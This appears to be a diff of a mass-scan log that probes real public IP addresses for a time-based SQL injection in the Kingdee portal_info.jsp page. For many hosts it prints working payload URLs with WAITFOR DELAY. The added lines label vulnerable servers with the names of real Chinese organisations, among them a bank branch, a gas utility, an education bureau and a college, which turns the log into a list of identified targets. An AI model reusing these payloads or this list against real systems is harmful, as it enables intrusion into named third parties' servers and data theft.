@@ -211,6 +211,7 @@ http://222.134.133.110:80//kingdee/portal/portal_info.jsp?id=1;WAITFOR DELAY '0:
 http://61.191.27.210:80/
 [*]both /ctop/ /kingdee/ return 404 !
 
+柔然
 http://60.194.110.187:80/
 [OK] dir:ctop found !
 [*]payload found:
@@ -222,6 +223,7 @@ http://218.24.104.18:8080/
 http://59.71.135.253:8090/
 [*]both /ctop/ /kingdee/ return 404 !
 
+宁夏地址矿产真斟查开发局
 http://61.133.195.126:8090/
 [OK] dir:ctop found !
 [*]payload found:
@@ -232,6 +234,7 @@ http://61.191.27.126:8080/
 [*]payload found:
 http://61.191.27.126:8080//ctop/portal/portal_info.jsp?id=1;WAITFOR DELAY '0:0:1'--
 
+潍坊港华燃气
 http://218.59.139.234:8086/
 [OK] dir:ctop found !
 [*]payload found:
@@ -252,6 +255,7 @@ http://58.135.80.206:80/
 [*]payload found:
 http://58.135.80.206:80//ctop/portal/portal_info.jsp?id=1;WAITFOR DELAY '0:0:1'--
 
+北京市政投资有限公司
 http://118.186.200.10:80/
 [OK] dir:ctop found !
 [*]payload found:
@@ -260,6 +264,7 @@ http://118.186.200.10:80//ctop/portal/portal_info.jsp?id=1;WAITFOR DELAY '0:0:1'
 http://60.28.196.17:80/
 [*]both /ctop/ /kingdee/ return 404 !
 
+中珠
 http://112.91.82.174:8080/
 [OK] dir:ctop found !
 [*]payload found:
@@ -268,6 +273,7 @@ http://112.91.82.174:8080//kingdee/portal/portal_info.jsp?id=1;WAITFOR DELAY '0:
 http://218.92.22.187:8080/
 [*]both /ctop/ /kingdee/ return 404 !
 
+冠豪
 http://218.14.208.64:8080/
 [OK] dir:ctop found !
 [*]payload found:
@@ -283,6 +289,7 @@ http://59.175.236.154:81/
 [*]payload found:
 http://59.175.236.154:81//kingdee/portal/portal_info.jsp?id=1;WAITFOR DELAY '0:0:1'--
 
+金城医药
 http://222.173.243.206:81/
 [OK] dir:ctop found !
 [*]payload found:
@@ -293,6 +300,7 @@ http://61.155.3.92:80/
 [*]payload found:
 http://61.155.3.92:80//ctop/portal/portal_info.jsp?id=1;WAITFOR DELAY '0:0:1'--
 
+上海物资信息中心
 http://211.144.123.157:8080/
 [OK] dir:ctop found !
 [*]payload found:
@@ -311,6 +319,7 @@ http://59.108.84.205:80/
 [*]payload found:
 http://59.108.84.205:80//ctop/portal/portal_info.jsp?id=1;WAITFOR DELAY '0:0:1'--
 
+百联集团教育培训中心
 http://203.156.203.51:8080/
 [OK] dir:ctop found !
 [*]payload found:
@@ -329,6 +338,7 @@ http://218.90.214.94:8080/
 [*]payload found:
 http://218.90.214.94:8080//ctop/portal/portal_info.jsp?id=1;WAITFOR DELAY '0:0:1'--
 
+米源集团
 http://116.228.10.166:80/
 [OK] dir:ctop found !
 [*]payload found:
@@ -352,16 +362,19 @@ http://119.44.222.235:81/
 [*]payload found:
 http://119.44.222.235:81//ctop/portal/portal_info.jsp?id=1;WAITFOR DELAY '0:0:1'--
 
+国机集团 重庆材料研究院
 http://124.162.217.49:8090/
 [OK] dir:ctop found !
 [*]payload found:
 http://124.162.217.49:8090//kingdee/portal/portal_info.jsp?id=1;WAITFOR DELAY '0:0:1'--
 
+安徽新华学院
 http://120.210.74.162:80/
 [OK] dir:ctop found !
 [*]payload found:
 http://120.210.74.162:80//ctop/portal/portal_info.jsp?id=1;WAITFOR DELAY '0:0:1'--
 
+米多奇
 http://61.163.240.212:8080/
 [OK] dir:ctop found !
 [*]payload found:
@@ -380,6 +393,7 @@ http://218.2.75.62:80/
 [*]payload found:
 http://218.2.75.62:80//ctop/portal/portal_info.jsp?id=1;WAITFOR DELAY '0:0:1'--
 
+中国银行马鞍山分行
 http://111.38.40.77:8112/
 [OK] dir:ctop found !
 [*]payload found:
@@ -390,11 +404,13 @@ http://114.251.68.242:80/
 [*]payload found:
 http://114.251.68.242:80//kingdee/portal/portal_info.jsp?id=1;WAITFOR DELAY '0:0:1'--
 
+管好高新
 http://221.4.245.218:8080/
 [OK] dir:ctop found !
 [*]payload found:
 http://221.4.245.218:8080//kingdee/portal/portal_info.jsp?id=1;WAITFOR DELAY '0:0:1'--
 
+桐城市教育局
 http://218.23.240.19:8080/
 [OK] dir:ctop found !
 [*]payload found:
